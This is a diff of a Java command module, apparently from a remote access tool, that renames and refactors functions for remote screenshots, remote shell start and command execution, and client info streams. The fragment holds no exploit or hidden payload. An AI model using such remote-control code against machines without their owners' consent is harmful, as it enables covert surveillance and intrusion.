@@ -19,7 +19,6 @@ package subterranean.crimson.server.commands;
  *
  */
 
-import java.io.File;
 import java.io.IOException;
 import java.nio.file.Files;
 import java.nio.file.Paths;
@@ -31,7 +30,6 @@ import java.util.Random;
 import javax.swing.ImageIcon;
 
 import subterranean.crimson.server.HostInfo;
-import subterranean.crimson.server.Server;
 import subterranean.crimson.server.ServerUtilities;
 import subterranean.crimson.server.network.Connection;
 import subterranean.crimson.universal.BMN;
@@ -44,8 +42,8 @@ import subterranean.crimson.universal.exceptions.InvalidResponseException;
 import subterranean.crimson.universal.exceptions.NoReplyException;
 import subterranean.crimson.universal.streams.filestream.FSParameters;
 import subterranean.crimson.universal.streams.filestream.FileStream;
-import subterranean.crimson.universal.transfer.DownloadTransfer;
-import subterranean.crimson.universal.transfer.UploadTransfer;
+import subterranean.crimson.universal.streams.infostream.ISParameters;
+import subterranean.crimson.universal.streams.infostream.InfoStream;
 
 public enum ClientCommands {
 	;
@@ -262,9 +260,9 @@ public enum ClientCommands {
 		c.send(mreq);
 	}
 
-	public static ImageIcon quickScreenshot(Connection c) throws InvalidResponseException {
+	public static ImageIcon screenmanager_screenshot(Connection c, int monitorID) throws InvalidResponseException {
 
-		Message mreq = new Message(randId(), BMN.SCREENMANAGER_screenshot, 0);
+		Message mreq = new Message(randId(), BMN.SCREENMANAGER_screenshot, monitorID);
 		c.send(mreq);
 		Message mres = c.i.getId(mreq.getStreamID());
 		if (mres == null || mres.auxObject == null || !(mres.auxObject[0] instanceof ImageIcon)) {
@@ -279,7 +277,7 @@ public enum ClientCommands {
 		return new Random().nextInt(Integer.MAX_VALUE);
 	}
 
-	public static int shell_init(Connection c) throws InvalidResponseException {
+	public static int shell_initialize(Connection c) throws InvalidResponseException {
 		Message mreq = new Message(randId(), BMN.SHELL_initialize);
 		c.send(mreq);
 		Message output = c.i.getId(mreq.getStreamID());
@@ -297,7 +295,7 @@ public enum ClientCommands {
 
 	}
 
-	public static String[] shell_run(Connection c, String command, int shellID) throws InvalidResponseException {
+	public static String[] shell_execute(Connection c, String command, int shellID) throws InvalidResponseException {
 		Object[] o = { command, shellID };
 
 		Message mreq = new Message(randId(), BMN.SHELL_execute);
@@ -362,9 +360,12 @@ public enum ClientCommands {
 
 	public static void startInfoStream(Connection c, int id, long p) {
 
-		Message m = new Message(randId(), BMN.STREAMCONTROL_start);
-		m.auxObject = new Object[] { id, p };
-		c.send(m);
+		ISParameters isp = new ISParameters();
+		isp.setSender(false);
+		
+		InfoStream is = new InfoStream(isp);
+		is.start();
+		
 
 	}
 
@@ -379,13 +380,9 @@ public enum ClientCommands {
 		c.send(m);
 	}
 
-	public static void client_refresh(Connection c) {
-		try {
-			c.getProfile().info = getInfo(c);
+	public static void client_refresh(Connection c) throws NoReplyException {
 
-		} catch (NoReplyException e) {
-
-		}
+		c.getProfile().info = getInfo(c);
 
 	}
 
